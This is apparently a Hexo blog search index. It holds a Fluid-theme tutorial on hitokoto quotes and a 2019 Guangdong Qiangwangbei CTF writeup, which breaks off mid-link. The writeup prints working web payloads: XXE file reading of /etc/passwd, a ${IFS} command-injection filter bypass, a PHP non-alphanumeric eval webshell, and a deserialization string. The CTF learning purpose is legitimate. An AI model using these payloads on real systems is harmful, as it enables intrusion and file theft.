<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fluid主题博客主页添加一言(hitokoto)手把手教学</title>
    <link href="/2020/09/21/fluid-add-hitokoto/"/>
    <url>/2020/09/21/fluid-add-hitokoto/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>所以说爱恨真是奇怪的东西，有的早早腐烂入土，有的刻骨。 ——「全球高考」<br><a id="more"></a></p><h4 id="启发"><a href="#启发" class="headerlink" title="启发"></a>启发</h4><p>不知不觉博客换了yilia、next、fluid三个主题了，三个主题都用了挺长时间。偶然间看到别人发的博客主页有句很好看的句子，自己也想搞一个来于是就动手搞一搞……<br><img src="/img/2020-09-21/1.png" srcset="/img/static/loading.gif" alt="1"><br>对于我这种主页不知道哔哔什么废话的再适合不过了。然鹅那个博客刷新的时候并没有发起特殊的请求，不过还好后来在同事的博客找到获取一句话的网络请求<del>，后来发现这个叫一言而且很多博客也有在用，孤陋寡闻了[捂脸]</del><br><img src="/img/2020-09-21/2.png" srcset="/img/static/loading.gif" alt="2"><br>首先fluid_config.yml中首页的一句话是在index下的slogan中的text设置，顺便添加<code>hitokoto</code>参数，方便开启和关闭一言。<br><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><span class="hljs-attr">  banner_img:</span> <span class="hljs-string">/img/default.jpg</span>  <span class="hljs-comment"># 首页 Banner 头图，以下相同</span><span class="hljs-attr">  banner_img_height:</span> <span class="hljs-number">100</span>  <span class="hljs-comment"># 头图高度，屏幕百分比，available: 0 - 100</span><span class="hljs-attr">  banner_mask_alpha:</span> <span class="hljs-number">0.3</span>  <span class="hljs-comment"># 头图黑色蒙版的透明度，available: 0 - 1.0， 0 是完全透明（无蒙版），1 是完全不透明</span><span class="hljs-attr">  post_default_img:</span> <span class="hljs-string">''</span> <span class="hljs-comment"># 默认的文章封面图，当没有指定 index_img 时会使用该图片，若都为空则不显示任何图片</span><span class="hljs-attr">  slogan:</span>  <span class="hljs-comment"># 首页副标题的独立设置</span><span class="hljs-attr">    enable:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 为 false 则不显示任何内容</span><span class="hljs-attr">    text:</span> <span class="hljs-string">''</span><span class="hljs-attr">  hitokoto:</span><span class="hljs-attr">    enable:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># 开启hitokoto优先显示hitokoto</span><span class="hljs-attr">  auto_excerpt:</span><span class="hljs-attr">    enable:</span> <span class="hljs-literal">true</span><span class="hljs-attr">  post_url_target:</span> <span class="hljs-string">_self</span>  <span class="hljs-comment"># available: _blank | _self</span><span class="hljs-attr">  post_meta:</span> <span class="hljs-comment"># 是否显示文章信息（时间、分类、标签）</span><span class="hljs-attr">    date:</span> <span class="hljs-literal">true</span><span class="hljs-attr">    category:</span> <span class="hljs-literal">true</span><span class="hljs-attr">    tag:</span> <span class="hljs-literal">true</span><span class="hljs-string">...</span></code></pre></p><p><code>text</code>参数会传到<code>fluid/layout/index.ejs</code><br><img src="/img/2020-09-21/3.png" srcset="/img/static/loading.gif" alt="3"><br>最开始是想在这里更改为一言的一句话，在最上面可以通过插入<code>&lt;script&gt;</code>标签,然后使用ajax执行Get请求就可以获得一言的句子，但是此方法获取到的值只能在<code>&lt;script&gt;</code>内使用，不能赋值到ejs中<del>我也不会也没查到</del><strong>遂卒</strong><br>后来百度查到<code>hitokoto</code>有官方调用的文档–&gt;<a href="https://hitokoto.cn/" target="_blank" rel="noopener">传送门</a><br>也查到一个fluid主题添加一言的教程给了很多帮助–&gt;<a href="https://pxxyyz.com/posts/30454/" target="_blank" rel="noopener">传送门</a>，<del>然而那个人的博客主页并没有设置成功/doge</del>，还有这篇–&gt;<a href="https://blog.bill.moe/add-hitokoto/" target="_blank" rel="noopener">传送门</a><br>根据博客里讲的，修改的地方位于<code>layout\_partial\plugins\typed.ejs</code>，仔细想想也没错，修改<code>index.ejs</code>可以直接显示一言不用管其他文件但是实现起来有点困难，<code>typed.ejs</code>是打字机的js控制程序，通过修改<code>typed.ejs</code>实现index页面打印一言，其余页面该打印什么打印什么，只要加个if条件判断是index页面还是其他页面。</p><h4 id="修改typed-ejs"><a href="#修改typed-ejs" class="headerlink" title="修改typed.ejs"></a>修改typed.ejs</h4><p>首先原始的<code>typed.ejs</code>主要分为2部分，第一部分是打字机调用程序，第二部分是接口<br><img src="/img/2020-09-21/4.png" srcset="/img/static/loading.gif" alt="4"><br>首先把打字机调用程序改成<code>function</code>形式，通过调用<code>typing</code>函数来输出，需要传入的参数有id和hitokoto(subtitle)，在原始的<code>typed.ejs</code>中通过<code>&lt;%- data.subtitle %&gt;</code>形式来传参，改成函数的时候要改为<code>hitokoto</code>，同时在<code>typed.ejs</code>中的<code>#subtitle</code>是输出点<br><pre><code class="hljs undefined"><span class="hljs-keyword">var</span> typed = <span class="hljs-keyword">new</span> <span class="hljs-type">Typed</span>(<span class="hljs-string">'#subtitle'</span>, &#123;</code></pre></p><p>对应到layout.ejs中的如下位置，通过id来确定输出点<del>后来发现改了&lt;%- hitokoto %&gt;这个也可以，装死</del><br><img src="/img/2020-09-21/5.png" srcset="/img/static/loading.gif" alt="5"><br>如果控制台出现如下异常则是因为<code>typed.ejs</code>中#后面的参数和<code>layout.ejs</code>的输出点的id不一样导致打字机找不到输出点报的异常。<br><pre><code class="hljs undefined">TypeError: Cannot <span class="hljs-keyword">read</span> <span class="hljs-keyword">property</span><span class="hljs-title"> </span>'tagName' of null</code></pre></p><p>因为我的目标只需要修改index页面的打字机而其他页面还是原来的样子，一旦修改了<code>#subtitle</code>就会触发报错，当然也可以不修改，因为我一开始没搞懂就改了，就懒得改回去了。封装好typing函数之后<code>typing(&quot;subtitle&quot;, &quot;&lt;%- data.subtitle %&gt;&quot;)</code>就可以调用，达到原来的样子根据参考的博客教程添加<code>&lt;% if(is_post()) { %&gt;</code>条件可以过让文章打印原始的subtitle，也就是对应着文章的标题，但是还不行，在其他归档、标签、关于等页面还是会显示一言。打开<code>about.ejs</code>和<code>page.ejs</code>对比会发现固定页面<code>page.layout</code>则是背设为固定，<code>page.ejs</code>则不是<br><pre><code class="hljs undefined"><span class="hljs-comment">//about.ejs</span>page<span class="hljs-selector-class">.layout</span> = <span class="hljs-string">"about"</span><span class="hljs-comment">//page.ejs</span><span class="hljs-selector-tag">var</span> layout = page.layout</code></pre></p><p>因此用<code>&amp;&amp; page.layout!==&#39;about&#39; &amp;&amp; page.layout!==&#39;links&#39; &amp;&amp; page.layout!==&#39;archive&#39; &amp;&amp; page.layout!==&#39;tags&#39;</code>可以排除掉不想展示的页面。(如果你想要所有页面设为一言就去掉即可)。按照博客教程是只显示一句话，没有出处。对于引用别人的东西我喜欢加上出处<br><pre><code class="hljs undefined">data<span class="hljs-selector-class">.hitokoto</span> + <span class="hljs-string">'&lt;br&gt;&lt;br&gt;&lt;span class="from" id="from"&gt;'</span> + <span class="hljs-string">' ——「'</span> +data<span class="hljs-selector-class">.from</span> + <span class="hljs-string">'」&lt;/span&gt;'</span></code></pre></p><p>关于出处一开始是用两个函数调用去输出然后发现很乱，一个句子和出处一起输出又不知道怎么实现出处右对齐<del>学艺不精,等等我本来就不是专精这个的→_→。</del>于是就通过一些css调整使形式相对更美观一些。<br>修改后的<code>type.ejs</code>如下</p><pre><code class="hljs undefined"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> <span class="hljs-keyword">if</span>(theme.fun_features.typing.enable &amp;&amp; page.subtitle !== <span class="hljs-literal">false</span>)&#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">%-</span></span></span><span class="ruby"> js_ex(theme.static_prefix.typed, <span class="hljs-string">"/typed.min.js"</span>) </span><span class="xml"><span class="hljs-tag">%&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">typing</span><span class="hljs-params">(id, hitokoto)</span></span>&#123;      <span class="hljs-keyword">var</span> typed = <span class="hljs-keyword">new</span> Typed(<span class="hljs-string">'#'</span> + id, &#123;        strings: [          <span class="hljs-string">'  '</span>,          hitokoto + <span class="hljs-string">"&amp;nbsp;"</span>,        ],        cursorChar: <span class="hljs-string">"&lt;%-</span></span></span><span class="ruby"> theme.fun_features.typing.cursorChar </span><span class="xml"><span class="undefined">%&gt;",        typeSpeed: &lt;%-</span></span><span class="ruby"> theme.fun_features.typing.typeSpeed </span><span class="xml"><span class="undefined">%&gt;,        loop: &lt;%-</span></span><span class="ruby"> theme.fun_features.typing.loop </span><span class="xml"><span class="javascript">%&gt;,      &#125;);      typed.stop();      $(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        $(<span class="hljs-string">".typed-cursor"</span>).addClass(<span class="hljs-string">"h2"</span>);        typed.start();      &#125;);    &#125;;        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span></span></span><span class="ruby"> <span class="hljs-keyword">if</span>(is_post()) &#123; </span><span class="xml"><span class="actionscript">%&gt;    typing(<span class="hljs-string">"subtitle"</span>, <span class="hljs-string">"&lt;%-</span></span></span><span class="ruby"> data.subtitle </span><span class="xml"><span class="undefined">%&gt;")  &lt;%</span></span><span class="ruby"> &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(theme.index.hitokoto.enable &amp;&amp; page.layout!==<span class="hljs-string">'about'</span> &amp;&amp; page.layout!==<span class="hljs-string">'links'</span> &amp;&amp; page.layout!==<span class="hljs-string">'archive'</span> &amp;&amp; page.layout!==<span class="hljs-string">'tags'</span>) &#123; </span><span class="xml"><span class="javascript">%&gt;    fetch(<span class="hljs-string">'https://v1.hitokoto.cn'</span>)    .then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.json())    .then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;       typing(<span class="hljs-string">"hitokoto"</span>, (data.hitokoto + <span class="hljs-string">'&lt;br&gt;&lt;br&gt;&lt;span class="from" id="from"&gt;'</span> + <span class="hljs-string">' ——「'</span> +data.from + <span class="hljs-string">'」&lt;/span&gt;'</span>))    &#125;)    .catch(<span class="hljs-built_in">console</span>.error)    &lt;%</span></span><span class="ruby"> &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(page.layout!== <span class="hljs-string">''</span> ) &#123; </span><span class="xml"><span class="actionscript">%&gt;        typing(<span class="hljs-string">"subtitle"</span>, <span class="hljs-string">"&lt;%-</span></span></span><span class="ruby"> data.subtitle </span><span class="xml"><span class="undefined">%&gt;")    &lt;%</span></span><span class="ruby"> &#125; </span><span class="xml"><span class="undefined">%&gt;  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><h4 id="修改layout-ejs"><a href="#修改layout-ejs" class="headerlink" title="修改layout.ejs"></a>修改layout.ejs</h4><p><code>layout.ejs</code>则和博客教程的那样即可<br><pre><code class="hljs undefined"><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h2"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"subtitle"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> <span class="hljs-keyword">if</span>(theme.fun_features.typing.enable == <span class="hljs-literal">false</span>) &#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">%-</span></span></span><span class="ruby"> subtitle </span><span class="xml"><span class="hljs-tag">%&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> <span class="hljs-keyword">if</span>(!is_post()) &#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h2"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"subtitle"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> <span class="hljs-keyword">if</span>(theme.fun_features.typing.enable == <span class="hljs-literal">false</span>) &#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">%-</span></span></span><span class="ruby"> hitokoto </span><span class="xml"><span class="hljs-tag">%&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> <span class="hljs-keyword">if</span>(is_post() &amp;&amp; page.meta !== <span class="hljs-literal">false</span>) &#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">%-</span></span></span><span class="ruby"> partial(<span class="hljs-string">'_partial/post-meta'</span>) </span><span class="xml"><span class="hljs-tag">%&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="ruby"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></p><p>成品如下，还有在博客下方评论框实现的。<del>为什么刷不到那句话。</del><br><img src="/img/2020-09-21/6.png" srcset="/img/static/loading.gif" alt="6"></p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>hitokoto</tag>
      
      <tag>fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019广东省强网杯writeup</title>
    <link href="/2019/09/11/qiangwangbei-GD-writewp/"/>
    <url>/2019/09/11/qiangwangbei-GD-writewp/</url>
    
    <content type="html"><![CDATA[<p>这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛<del>脑洞</del>难度不算太大，做的还算不错。<br><a id="more"></a></p><h5 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h5><h6 id="完美的错误"><a href="#完美的错误" class="headerlink" title="完美的错误"></a>完美的错误</h6><p>题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？<code>RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX</code><br>关键点：避免字符混淆<br>这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章–&gt;<a href="https://xz.aliyun.com/t/2255" target="_blank" rel="noopener">传送门</a><br>错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了<br><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8</span>__b58chars = <span class="hljs-string">'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789'</span> <span class="hljs-comment">#这里原本是123456789A-Za-z的</span>__b58base = len(__b58chars)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b58encode</span><span class="hljs-params">(v)</span>:</span>    <span class="hljs-string">""" encode v, which is a string of bytes, to base58.    """</span>    long_value = int(v.encode(<span class="hljs-string">"hex_codec"</span>), <span class="hljs-number">16</span>)    result = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> long_value &gt;= __b58base:        div, mod = divmod(long_value, __b58base)        result = __b58chars[mod] + result        long_value = div    result = __b58chars[long_value] + result    <span class="hljs-comment"># Bitcoin does a little leading-zero-compression:</span>    <span class="hljs-comment"># leading 0-bytes in the input become leading-1s</span>    nPad = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v:        <span class="hljs-keyword">if</span> c == <span class="hljs-string">'\0'</span>:            nPad += <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">return</span> (__b58chars[<span class="hljs-number">0</span>] * nPad) + result<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b58decode</span><span class="hljs-params">(v)</span>:</span>    <span class="hljs-string">""" decode v into a string of len bytes    """</span>    long_value = <span class="hljs-number">0L</span>    <span class="hljs-keyword">for</span> (i, c) <span class="hljs-keyword">in</span> enumerate(v[::<span class="hljs-number">-1</span>]):        long_value += __b58chars.find(c) * (__b58base ** i)    result = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> long_value &gt;= <span class="hljs-number">256</span>:        div, mod = divmod(long_value, <span class="hljs-number">256</span>)        result = chr(mod) + result        long_value = div    result = chr(long_value) + result    nPad = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v:        <span class="hljs-keyword">if</span> c == __b58chars[<span class="hljs-number">0</span>]:            nPad += <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">break</span>    result = chr(<span class="hljs-number">0</span>) * nPad + result    <span class="hljs-keyword">return</span> result<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    <span class="hljs-comment"># print  b58encode("hello world")</span>    <span class="hljs-keyword">print</span>  b58decode(<span class="hljs-string">"RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX"</span>)</code></pre></p><p>flag{adb88f7b70a20983833a7615fb103e01}</p><h6 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h6><p>用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，<code>__mh_execute_header</code>、<code>/usr/lib/libSystem.B.dylib</code>这些都是mach-o的可执行文件格式<del>别问我为什么知道，都是大佬发现的，我只是个复读机</del>，修复文件头如下，找到一个有例子的文章可以参考–&gt;<a href="https://www.jianshu.com/p/07f361f6e0d0" target="_blank" rel="noopener">传送门</a><br><img src="/img/2019-09-11/img_1.png" srcset="/img/static/loading.gif" alt=""><img src="/img/2019-09-11/img_2.png" srcset="/img/static/loading.gif" alt=""><br>程序关键伪代码如下<br><pre><code class="hljs c"><span class="hljs-meta">#start</span>__<span class="hljs-function">int64 <span class="hljs-title">start</span><span class="hljs-params">()</span></span>&#123;  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span>  __int64 v2; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  <span class="hljs-built_in">strcpy</span>(&amp;v1, <span class="hljs-string">"938gce1`872db99db`b342d23c0g9g2d"</span>);  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">48</span> )    sub_100000E40(&amp;v1);  result = __stack_chk_guard;  <span class="hljs-keyword">if</span> ( __stack_chk_guard == v2 )    result = <span class="hljs-number">0L</span>L;  <span class="hljs-keyword">return</span> result;&#125;#sub_100000E40<span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">sub_100000E40</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span></span>&#123;  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a1); ++i )    a1[i] ^= <span class="hljs-number">1u</span>;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"flag为:%s\n"</span>, a1);&#125;</code></pre></p><pre><code class="hljs python">code = <span class="hljs-string">'938gce1`872db99db`b342d23c0g9g2d'</span>text = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:    text += chr(ord(i)^<span class="hljs-number">1</span>)<span class="hljs-keyword">print</span> text<span class="hljs-comment">#829fbd0a963ec88ecac253e32b1f8f3e</span></code></pre><p>flag{829fbd0a963ec88ecac253e32b1f8f3e}</p><h6 id="脑筋急转弯"><a href="#脑筋急转弯" class="headerlink" title="脑筋急转弯"></a>脑筋急转弯</h6><p>下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用<code>SilentEye</code>可以提取出一个zip文件<del>我去还有这操作</del><br><img src="/img/2019-09-11/img_3.png" srcset="/img/static/loading.gif" alt=""><br>然后爆破出密码<br><img src="/img/2019-09-11/img_4.png" srcset="/img/static/loading.gif" alt=""><br>得到一堆012012012又卡住了，后来某位大佬把0-&gt;<code>.</code>,1-&gt;<code>!</code>,2-&gt;<code>?</code>然后得到<code>Ook</code>码，然后<code>Ook</code>转<code>Brainfuck</code>转<code>text</code>然后就解出来了O_o..(空格要去掉)<br><pre><code class="hljs undefined">lalala,wo <span class="hljs-keyword">shi </span>mai <span class="hljs-keyword">bao </span>de xiao hang <span class="hljs-keyword">jia.flag&#123;08277716193eda6c592192966e9d6f39&#125; </span>ni neng cai dao ta me?</code></pre></p><p>flag{08277716193eda6c592192966e9d6f39}</p><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><h6 id="小明又被拒绝了"><a href="#小明又被拒绝了" class="headerlink" title="小明又被拒绝了"></a>小明又被拒绝了</h6><p>题目描述：小明又被拒绝了，你能帮助他吗？<br>抓包添加请求头<code>X-Forwarded-For: 127.0.0.1</code>和把admin改为1<br><img src="/img/2019-09-11/img_5.png" srcset="/img/static/loading.gif" alt=""><br>flag{xxasdasdd_for}</p><h6 id="XX"><a href="#XX" class="headerlink" title="XX?"></a>XX?</h6><p>题目描述：XXXXX？？？<br>联想到XXE，扫描得到<code>index.php</code>和<code>flag.php</code>文件，扫描备份文件得到<code>index.php~</code>文件<br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#鍏抽棴Warning</span>error_reporting(E_ALL^E_NOTICE^E_WARNING);$xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);$dom = <span class="hljs-keyword">new</span> DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);$user = $creds-&gt;user;$pass = $creds-&gt;pass;<span class="hljs-keyword">echo</span> <span class="hljs-string">"CTF:"</span> . <span class="hljs-string">"&lt;br&gt;"</span> . <span class="hljs-string">"$user"</span>;<span class="hljs-meta">?&gt;</span></code></pre></p><p>POST上去一个xxe的payload<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-meta">&lt;!DOCTYPE note[&lt;!ELEMENT note (user)&gt;&lt;!ENTITY hack3r "Hu3sky"&gt;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>&amp;hack3r;<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre></p><p><img src="/img/2019-09-11/img_6.png" srcset="/img/static/loading.gif" alt=""><br>成了，有戏，试着读了一下<code>/etc/passwd</code>文件<br><img src="/img/2019-09-11/img_7.png" srcset="/img/static/loading.gif" alt=""><br>ok,已经可以任意文件读取了<br>尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了<br><img src="/img/2019-09-11/img_8.png" srcset="/img/static/loading.gif" alt=""><br>flag{IUyasd8213123123890}</p><h6 id="免费的-ping一下"><a href="#免费的-ping一下" class="headerlink" title="免费的,ping一下~"></a>免费的,ping一下~</h6><p>题目描述：听说ping很好玩~<br>考察命令执行，过滤了<code>&lt;</code>，<code>&gt;</code>，<code>&amp;</code>，<code>|</code>，<code>空格</code>，<code>%0*</code>，还有一些关键字可以用拼接的方法绕过，可以用<code>${IFS}</code>替换空格，<code>$a=ca;$b=t;$a$b</code>这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行<br><pre><code class="hljs undefined"><span class="hljs-attr">A</span>=;a=fl;b=ag;se<span class="hljs-string">""</span>d<span class="hljs-variable">$&#123;IFS&#125;</span>-n<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">'16,18p'</span><span class="hljs-variable">$&#123;IFS&#125;</span>/<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span></code></pre></p><p><img src="/img/2019-09-11/img_9.png" srcset="/img/static/loading.gif" alt=""><br>flag{llllll_U_GeT_Th3_fl4g}</p><h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>题目描述：PHP是世界上最…..的语言<br>扫描得到<code>index.php</code><br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(E_ALL^E_NOTICE^E_WARNING);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetYourFlag</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">"./flag.php"</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'code'</span>]))&#123;    $code = $_GET[<span class="hljs-string">'code'</span>];    <span class="hljs-comment">//print(strlen($code));</span>    <span class="hljs-keyword">if</span>(strlen($code)&gt;<span class="hljs-number">27</span>)&#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">"Too Long."</span>);    &#125;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/[a-zA-Z0-9_&amp;^&lt;&gt;"\']+/'</span>,$_GET[<span class="hljs-string">'code'</span>])) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not Allowed."</span>);    &#125;    @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'code'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;      highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></p><p>这是一个无字符马，可以参考freebuf上的一篇文章–&gt;<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">传送门</a>，这是php7的一个解析特性，简单来说就是通过和<code>~</code>符号异或出我们需要的字符。<br><pre><code class="hljs undefined">(~<span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%97</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%96</span><span class="hljs-symbol">%91</span><span class="hljs-symbol">%99</span><span class="hljs-symbol">%90</span>)()<span class="hljs-comment">;</span></code></pre></p><p>这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的<br><img src="/img/2019-09-11/img_10.png" srcset="/img/static/loading.gif" alt=""><br>然后上面也给了getflag的函数我们，直接调用就可以了<br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = urlencode(~<span class="hljs-string">'GetYourFlag'</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-comment">//%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98</span></code></pre></p><p>payload为<code>(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();</code><br><img src="/img/2019-09-11/img_11.png" srcset="/img/static/loading.gif" alt=""><br>flag{3904c5df2e894ca02a21004feb21e617}<br>备注：php是世界上最好的语言hah</p><h6 id="API"><a href="#API" class="headerlink" title="API"></a>API</h6><p>题目描述：API<br>打开提示<code>Api!wow</code>，访问api目录提示<br><img src="/img/2019-09-11/img_12.png" srcset="/img/static/loading.gif" alt=""><br>提示<code>post filename</code>和传入一个数组，不赋值时候提示<code>json_decode error</code>,固传入一个json数组，盲猜file参数。结果正确<br><img src="/img/2019-09-11/img_13.png" srcset="/img/static/loading.gif" alt=""><br>在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php<br><img src="/img/2019-09-11/img_14.png" srcset="/img/static/loading.gif" alt=""><br>得到源码，看了下，是反序列化。把hack.php也读出来<br><img src="/img/2019-09-11/img_15.png" srcset="/img/static/loading.gif" alt=""><br>看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。(<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">小声bb</a>:<a href="https://www.cnblogs.com/pureqh/p/10161993.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">全都是网上原题</a>)<br>通过../index.php的过滤条件可以构造出反序列化的字符串<br><pre><code class="hljs undefined"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:+4</span><span class="hljs-selector-pseudo">:"hack"</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">15</span>:<span class="hljs-string">"fffffaa_not.php"</span>;&#125;</code></pre></p><p>发送的时候需要url编码一下。然后得到源码fffffaa_not.php<br><img src="/img/2019-09-11/img_16.png" srcset="/img/static/loading.gif" alt=""><br>是一个写shell的功能。其中判断规则preg_match(‘[&lt;&gt;?]’, $text)。<br>这个绕过很简单了，变成数组就可以了。参考–&gt;<a 